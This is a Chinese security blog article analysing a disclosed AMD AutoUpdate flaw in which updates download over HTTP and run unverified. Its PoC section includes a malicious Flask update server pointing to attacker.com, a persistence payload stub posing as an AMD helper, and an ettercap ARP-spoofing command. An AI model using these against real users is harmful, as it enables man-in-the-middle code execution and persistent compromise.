#  【林晓月的新漏洞科普】AMD AutoUpdate 远程代码执行漏洞深度分析（官方无影响忽略）  
 幻泉之洲   2026-02-08 01:20  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibcU7EbtLwxYK4wN1Vx48RjJUyOsZUzLjOibFCz5icJQNic7EvA37Wy5qibMvAdfJ6y4nMzjPiaISJ2JwPc6OVsPjF8FSHRnzibicQxqD4/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibeyicq3UGfbLc8VQaPf5Q8cOqdv7hqYXOJLdiczia6UL1Jjdc4drCq5FFDK8TXpAnSHI0VU1LvK11FbibbbvI7wRYicwjGBhtYrNuwc/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibcqYXa9W78HiauaegZmyYg5zpC7G0IROibGQ09UZGyG2TRsaruHPGB0xJWibTjhxoOjia3fyEIrO3zVaBB8sQvc8umcVHbDsdJIaqw/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibdfoMRve7XYdymNibqSBGfz6iaEub7BCwnTZ3iagHiaSm6dIXVwIm1yySeDK3CuFgRWvfNZz3vjIMhGiccfC5hreZYggWic5fics7Beia8/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibepWlcDDwpvHdqAlXfz1yn8tfD6vnbpBp7dzznfDIx6nogoqWOBK5OOnCPxtUVoL6ZN4nnIt295ETN3f884UkmBKg9InATTCkQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6Tibcvv3GibTJibctNiaSzLDZgMy6niaRkhhe0kMIPvX5VyRDLu0UzWmzbJ8huzMCpjnG5Udt8Xsh7ibNE74uszMEUlMzDKl3dSXicjSeR8/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibduibMicbWYibgAulUMdRAuKR8rC4aDEf9ic92S25I6ZNg2bs4HZsmxTyaOPUajFaMJiaRuDXaSluOhMYxb6lElRqcoqyzCiap27MJkI/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibfR6PFO9HflCqCqHYbWgibyhuA3pTYeEwEIQeQ8KBS2Qr56VeGDAq1vmGQDzhX7Q4OeA5sc1jS1HmS5mFIC5IDHO1QeakibuT5tw/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibf78LhrCdALyUfXMJeglPYKFwVBXsicUoPoFCUv5z60YBYWiaWCI5xorDaTTdeT6xoYxgtrgrmeianCYicSKBX7jdIyibI5GrfczzwA/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibfYkaGWXzqQVKBRGBozKX9vMZ1TPDxrksEaUVlmfg0mnNco9MHZficMBq2zRTWx94OfibzOBfEibjeyamc12VkZAqHGtclzouPpLM/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibeGRLMsPOwkNCyMegHdE7ytG5ibrh0bbUYBzLIKZ0pHEuMIBDeyhWOlrHiciaZlvJApru95o77SjbADQW0E1FTibBwEBSmKWevOm1A/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
技术文稿：  
# AMD AutoUpdate 远程代码执行漏洞深度分析  
## 中间人攻击下的供应链劫持与权限维持  
  
**发布时间：**  
 2026年2月6日  
**危害等级：**  
 高危（CVSS 预估 8.1 - 9.8）  
**影响范围：**  
 所有启用 AMD AutoUpdate 的 Windows 系统  
## 一、漏洞概述  
  
2026年1月，安全研究人员 **MrBruh**  
 在对 AMD AutoUpdate 组件进行逆向分析时，发现了一个**架构级安全缺陷**  
：该组件在获取更新元数据时使用 HTTPS，但在下载实际可执行文件时降级至 HTTP，且**完全缺乏签名验证机制**  
。这一设计缺陷使得攻击者可通过中间人攻击（MITM）在目标系统上执行任意代码。  
  
值得注意的是，AMD 安全团队将该漏洞归类为 **"超出范围（Out of Scope）"**  
，理由是其需要中间人攻击前提条件。然而，在 ISP 级攻击、公共 Wi-Fi 劫持、DNS 投毒等场景下，此类攻击门槛已显著降低。  
## 二、技术原理深度剖析  
### 2.1 配置层：硬编码的更新源  
  
从反编译的 app.config  
 文件可见，AutoUpdate 组件将版本信息 URL 硬编码在配置中：  
```
<appSettings>
    <!--Development-->
    <add key="VersionInfo" value="https://www2.ati.com/drivers/patch/.../versioninfo.xml" />
    <!--Production
    <add key="VersionInfo" value="https://www2.ati.com/drivers/patch/.../versioninfo.xml" /> -->
</appSettings>
```  
  
**关键发现：**  
- 生产环境（Production）配置被注释，实际使用的是开发环境（Development）URL  
  
- 虽然使用 HTTPS，但这只是**虚假的安全感**  
——真正的危险在下一阶段  
  
### 2.2 协议降级：从 HTTPS 到 HTTP 的致命跳转  
  
当 AutoUpdate 请求 versioninfo.xml  
 后，返回的 XML 结构中包含实际的文件下载地址：  
```
<platform name="Windows" value="">
  <productfamily name="Applications" value="">
    <product label="AMD Ryzen Master">
      <name>RyzenMaster</name>
      <version>2.14.2.3341</version>
      <filePath>
        http://www2.ati.com/drivers/patch/ec1b73b4-bc2a...
      </filePath>
      <BitSystem>64</BitSystem>
      <installCommand/>
      <!-- ... -->
    </product>
  </productfamily>
</platform>
```  
  
**核心漏洞点：**<filePath>  
 标签明确使用 http://  
 协议，形成**"安全元数据 + 危险下载"**  
的混合模式。  
### 2.3 执行层：零验证的代码执行  
  
反编译的 InstallUpdates  
 方法揭示了最危险的环节：  
```
private void InstallUpdates(object f_downloadedFileSaveLocation)
{
    try
    {
        CLog.Trace("Start InstallUpdates()");
        string fileName = f_downloadedFileSaveLocation.ToString();
        Process process = new Process();
        process.Exited += Process_Exited;
        process.ErrorDataReceived += Process_DataReceivedEventHandler;
        process.EnableRaisingEvents = true;

        // 直接执行下载的文件，无任何验证！
        process.StartInfo.FileName = fileName;
        process.StartInfo.Arguments = appInstallCommand;
        process.Start();
        process.WaitForExit();
    }
    // ...
}
```  
## 三、实际劫持流程（PoC）  
### 3.1 攻击场景假设  
  
**场景 A：ISP/国家级攻击者**  
- 控制骨干网路由设备，针对 www2.ati.com  
 进行流量劫持  
  
- 影响范围：特定区域所有 AMD 用户  
  
**场景 B：本地网络攻击**  
- 公共 Wi-Fi、企业内网、 compromised 路由器  
  
- ARP 欺骗或 DNS 劫持指向恶意服务器  
  
**场景 C：DNS 投毒**  
- 污染 DNS 记录，使 www2.ati.com  
 解析至攻击者服务器  
  
### 3.2 攻击链详细步骤  
#### 阶段 1：侦察与准备  
  
攻击者首先获取合法的 versioninfo.xml  
 结构：  
```
# 获取合法 XML 作为模板
curl -o versioninfo.xml https://www2.ati.com/drivers/patch/.../versioninfo.xml
```  
  
分析 XML 结构，确定可注入点：  
- 修改 <filePath>  
 指向攻击者控制的 HTTP 服务器  
  
- 保持 <version>  
 号高于当前版本，触发更新机制  
  
#### 阶段 2：构建恶意更新服务器  
  
攻击者部署包含以下组件的服务器：  
```
# malicious_server.py - 概念验证
from flask import Flask, send_file, request
import xml.etree.ElementTree as ET

app = Flask(__name__)

@app.route('/drivers/patch/<path:filename>')
def serve_file(filename):
    if filename.endswith('versioninfo.xml'):
        # 返回篡改的 XML，指向恶意 payload
        xml = generate_malicious_xml()
        return xml, 200, {'Content-Type': 'application/xml'}

    # 提供伪装成 AMD 驱动的恶意可执行文件
    if 'ryzenmaster' in filename.lower():
        return send_file('payload.exe', 
                        mimetype='application/octet-stream',
                        as_attachment=True,
                        download_name='RyzenMasterSetup.exe')

    return "Not Found", 404

def generate_malicious_xml():
    # 构造包含恶意下载链接的 XML
    # 版本号必须高于当前安装版本才能触发更新
    xml_content = '''<?xml version="1.0"?>
    <platform name="Windows" value="">
      <productfamily name="Applications" value="">
        <product label="AMD Ryzen Master">
          <name>RyzenMaster</name>
          <version>99.99.99.9999</version>
          <filePath>http://attacker.com/drivers/patch/malicious_ryzenmaster.exe</filePath>
          <BitSystem>64</BitSystem>
          <MajorInstallCommand>/V" RUNAUTOUPDATEUI=1 /qr"</MajorInstallCommand>
        </product>
      </productfamily>
    </platform>'''
    return xml_content

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```  
#### 阶段 3：Payload 构建  
  
攻击者准备与合法 AMD 安装包行为一致的恶意程序：  
```
// payload.c - 概念验证级 Payload
// 实际攻击中可能使用更隐蔽的 DLL 侧载或合法程序劫持
#include <windows.h>
#include <stdio.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {

    // 第一阶段：执行正常的 AMD 驱动安装（迷惑用户）
    // ... 解压并运行真实的 AMD 驱动程序 ...

    // 第二阶段：植入后门/持久化机制
    // 1. 写入启动项
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, 
                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                 0, KEY_WRITE, &hKey);
    RegSetValueEx(hKey, "AMDUpdateHelper", 0, REG_SZ, 
                  (BYTE*)"C:\\Windows\\Temp\\amd_helper.exe", 30);
    RegCloseKey(hKey);

    // 2. 建立反向 Shell（示例）
    // 实际攻击可能使用更隐蔽的 C2 通信

    // 3. 清理痕迹，显示正常的安装完成界面
    MessageBox(NULL, "AMD Ryzen Master 已成功更新", 
               "AMD AutoUpdate", MB_OK | MB_ICONINFORMATION);

    return 0;
}
```  
#### 阶段 4：中间人劫持实施  
  
**ARP 欺骗场景（本地网络）：**  
```
# 使用 Ettercap 进行 ARP 欺骗 + 内容替换
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//

# 配合 Ettercap 的 filter 脚本替换 HTTP 响应
# 将合法的 versioninfo.xml 替换为恶意版本
```  
  
**执行流程：**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibeDUSjK8aAag40ZmOgOTiaOXMjw6etpmKlmicYgf2RkXUfkaMjnEiaeS6cSIL9qORdesIp2t764rKl2ouia9LcibibZ3kLAYDvr3Sep0/640?wx_fmt=png&from=appmsg "")  
## 四、时间线与披露过程  
<table><thead><tr style="font: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 0px;border-width: 0px;border-style: initial;border-color: inherit;border-image: initial;vertical-align: baseline;display: table-row;"><th align="left" style="font-family: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 10px;border-width: 0.8px 0px 0px;border-top-style: solid;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-top-color: rgba(0, 0, 0, 0.13);border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;font-style: inherit;font-variant: inherit;font-weight: 600;font-stretch: inherit;font-size: 14px;line-height: 22px;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;font-language-override: inherit;vertical-align: baseline;text-align: left;max-width: 480px;"><section><span leaf="">日期</span></section></th><th align="left" style="font-family: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 10px;border-width: 0.8px 0px 0px 0.8px;border-top-style: solid;border-right-style: initial;border-bottom-style: initial;border-left-style: solid;border-top-color: rgba(0, 0, 0, 0.13);border-right-color: initial;border-bottom-color: initial;border-left-color: rgba(0, 0, 0, 0.13);border-image: initial;font-style: inherit;font-variant: inherit;font-weight: 600;font-stretch: inherit;font-size: 14px;line-height: 22px;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;font-language-override: inherit;vertical-align: baseline;text-align: left;max-width: 480px;"><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr style="font: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 0px;border-width: 0px;border-style: initial;border-color: inherit;border-image: initial;vertical-align: baseline;display: table-row;"><td align="left" style="font-family: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 10px;border-width: 0.8px 0px 0px;border-top-style: solid;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-top-color: rgba(0, 0, 0, 0.13);border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: 14px;line-height: 22px;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;font-language-override: inherit;vertical-align: baseline;text-align: left;max-width: 480px;"><section><span leaf="">2026-01-27</span></section></td><td align="left" style="font-family: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 10px;border-width: 0.8px 0px 0px 0.8px;border-top-style: solid;border-right-style: initial;border-bottom-style: initial;border-left-style: solid;border-top-color: rgba(0, 0, 0, 0.13);border-right-color: initial;border-bottom-color: initial;border-left-color: rgba(0, 0, 0, 0.13);border-image: initial;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: 14px;line-height: 22px;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;font-language-override: inherit;vertical-align: baseline;text-align: left;max-width: 480px;"><section><span leaf="">研究人员发现漏洞</span></section></td></tr><tr style="font: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 0px;border-width: 0px;border-style: initial;border-color: inherit;border-image: initial;vertical-align: baseline;display: table-row;"><td align="left" style="font-family: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 10px;border-width: 0.8px 0px 0px;border-top-style: solid;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-top-color: rgba(0, 0, 0, 0.13);border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: 14px;line-height: 22px;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;font-language-override: inherit;vertical-align: baseline;text-align: left;max-width: 480px;"><section><span leaf="">2026-02-05</span></section></td><td align="left" style="font-family: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 10px;border-width: 0.8px 0px 0px 0.8px;border-top-style: solid;border-right-style: initial;border-bottom-style: initial;border-left-style: solid;border-top-color: rgba(0, 0, 0, 0.13);border-right-color: initial;border-bottom-color: initial;border-left-color: rgba(0, 0, 0, 0.13);border-image: initial;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: 14px;line-height: 22px;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;font-language-override: inherit;vertical-align: baseline;text-align: left;max-width: 480px;"><section><span leaf="">向 AMD 安全团队提交漏洞报告</span></section></td></tr><tr style="font: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 0px;border-width: 0px;border-style: initial;border-color: inherit;border-image: initial;vertical-align: baseline;display: table-row;"><td align="left" style="font-family: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 10px;border-width: 0.8px 0px 0px;border-top-style: solid;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-top-color: rgba(0, 0, 0, 0.13);border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: 14px;line-height: 22px;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;font-language-override: inherit;vertical-align: baseline;text-align: left;max-width: 480px;"><section><span leaf="">2026-02-05</span></section></td><td align="left" style="font-family: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 10px;border-width: 0.8px 0px 0px 0.8px;border-top-style: solid;border-right-style: initial;border-bottom-style: initial;border-left-style: solid;border-top-color: rgba(0, 0, 0, 0.13);border-right-color: initial;border-bottom-color: initial;border-left-color: rgba(0, 0, 0, 0.13);border-image: initial;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: 14px;line-height: 22px;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;font-language-override: inherit;vertical-align: baseline;text-align: left;max-width: 480px;"><strong data-v-1afa3a17="" style="font-family: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 0px;border: 0px;font-style: inherit;font-variant: inherit;font-weight: 600;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;font-language-override: inherit;vertical-align: baseline;"><span leaf="">AMD 关闭报告，标记为 &#34;Out of Scope&#34;</span></strong></td></tr><tr style="font: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 0px;border-width: 0px;border-style: initial;border-color: inherit;border-image: initial;vertical-align: baseline;display: table-row;"><td align="left" style="font-family: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 10px;border-width: 0.8px 0px 0px;border-top-style: solid;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-top-color: rgba(0, 0, 0, 0.13);border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: 14px;line-height: 22px;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;font-language-override: inherit;vertical-align: baseline;text-align: left;max-width: 480px;"><section><span leaf="">2026-02-06</span></section></td><td align="left" style="font-family: inherit;scrollbar-color: transparent transparent;margin: 0px;padding: 10px;border-width: 0.8px 0px 0px 0.8px;border-top-style: solid;border-right-style: initial;border-bottom-style: initial;border-left-style: solid;border-top-color: rgba(0, 0, 0, 0.13);border-right-color: initial;border-bottom-color: initial;border-left-color: rgba(0, 0, 0, 0.13);border-image: initial;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: 14px;line-height: 22px;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;font-language-override: inherit;vertical-align: baseline;text-align: left;max-width: 480px;"><section><span leaf="">研究人员发布技术博客公开披露</span></section></td></tr></tbody></table>  
**AMD 的回应理由：**  
> "Attacks requiring physical access to a victim's computer/device, man in the middle or compromised user accounts"  
  
  
**研究人员的反驳：**  
- 中间人攻击在当代网络环境中**并非边缘场景**  
  
- ISP 级攻击、公共 Wi-Fi 劫持、DNS 投毒等攻击手段已高度成熟  
  
- 修复成本极低（仅需强制 HTTPS + 添加签名验证），与潜在风险严重不成比例  
  
## 五、结论  
  
AMD AutoUpdate 漏洞是一个**典型的"低垂果实"式安全缺陷**  
：协议降级、零验证执行、权限提升三要素叠加，构成了完整的 RCE 攻击链。更令人担忧的是 AMD 对此的**消极响应态度**  
——在供应链安全日益重要的今天，将 MITM 攻击视为"超出范围"显示出对现代网络威胁模型的认知滞后。  
  
对于安全从业者，此案例强调了**纵深防御**  
的必要性：即使厂商拒绝修复，企业仍可通过网络层管控、端点防护、用户教育等手段降低风险。对于软件开发者，这是**安全默认（Secure by Default）**  
原则的反面教材——安全不应是可选配置，而应是架构基石。  
  
**参考资源：**  
- 原始博客：MrBruh's Epic Blog - "The RCE that AMD won't fix"  
  
**（虽然有原始博客，但是原始博客内容被删了，看来AMD公关了）**  
  
